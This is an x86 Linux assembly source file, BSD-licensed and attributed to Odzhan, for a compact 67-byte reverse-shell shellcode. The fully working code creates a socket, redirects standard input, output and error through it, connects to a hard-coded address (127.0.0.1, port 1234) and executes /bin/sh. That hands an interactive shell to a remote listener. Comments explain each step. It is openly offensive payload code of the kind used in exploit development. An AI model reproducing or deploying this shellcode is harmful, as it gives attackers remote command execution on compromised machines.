;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;    

; 67 byte reverse shell for linux/x86
; odzhan

    bits 32
    
    ; step 1, create a socket
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);    
    xor    ebx, ebx          ; ebx=0
    mul    ebx               ; eax=0, edx=0
    mov    al, 0x66          ; eax      = SYS_socketcall
    inc    ebx               ; ebx      = SYS_socket
    push   edx               ; protocol = IPPROTO_IP
    push   ebx               ; type     = SOCK_STREAM
    push   2                 ; family   = AF_INET
    mov    ecx, esp          ; ecx      = &args
    int    0x80
    
    xchg   eax, ebx          ; ebx      = s
    
    ; step 2, assign socket to stdin, stdout, stderr
    ; dup2 (s, STDIN_FILENO)
    ; dup2 (s, STDOUT_FILENO)
    ; dup2 (s, STDERR_FILENO)    
    pop    ecx               ; ecx=2
c_dup:
    mov    al, 0x3f          ; eax=SYS_dup2
    int    0x80 
    dec    ecx
    jns    c_dup             ; while (ecx >= 0)
    
    ; step 3, connect to remote host
    ; connect (s, &sa, sizeof(sa));   
    push   0x0100007f        ; 127.0.0.1
    push   0xD2040002        ; 1234, AF_INET
    mov    ecx, esp
    
    mov    al, 0x66          ; eax=SYS_socketcall    
    push   eax               ; sizeof(sa)
    push   ecx               ; &sa
    push   ebx               ; sockfd
    mov    ecx, esp          ; &args
    push   3
    pop    ebx               ; ebx=SYS_connect
    int    0x80
    
    ; step 4, execute /bin/sh
    ; execve("/bin//sh", NULL, NULL);    
    mov    al, 0xb           ; eax=SYS_execve
    push   edx               ; '\0'
    push   '//sh'            ; 
    push   '/bin'            ; 
    mov    ebx, esp          ; ebx="/bin//sh", 0
    xor    ecx, ecx          ; ecx=0 argv=0
    int    0x80              ; exec SYS_execve
